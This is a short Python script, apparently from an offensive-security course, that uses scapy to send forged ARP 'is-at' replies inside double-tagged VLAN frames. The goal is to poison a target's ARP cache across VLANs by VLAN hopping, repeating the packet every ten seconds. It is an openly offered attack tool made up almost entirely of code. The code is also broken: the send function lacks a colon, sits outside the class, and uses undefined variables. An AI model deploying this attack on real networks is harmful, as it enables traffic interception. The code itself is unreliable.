# Offensive Security Software
#SSE Program
#Attack: ARP Spoofing Over VLAN Hopping
#Date: January 31, 2016

'''
VLAN's limit broadcast traffic to the ports belonging to the same VLAN
therefore we cannot by default react to al ARP requests but have to
proactively tell the victim our MAC every few seconds like seen in the
other ARP spoofing example.  This code is identical  except for the fact
that every packet for our and than additionally for the destination vLAN
'''

import time
from scapy.all import sendp, ARP, Ether, Dot1Q

class ARP_Spoof_PKT():
    iface       = "en0"
    target_ip   = "192.168.15.1"
    fake_ip     = "192.168.13.1"
    fake_mac    = "c0:d3:de:ad:be:ef"
    our_vlan    = 1
    target_vlan = 2
    packet = ''

    def __init__(self):
        self.packet = Ether()/Dot1Q(vlan=self.our_vlan)/Dot1Q(vlan=self.target_vlan)/ \
         ARP(hwsrc=self.fake_mac, pdst=self.target_ip, psrc=self.fake_ip, op="is-at")


def spoof(self, interval=10)
    while True:
        sendp(packet, iface=iface)
        time.sleep(interval)
    
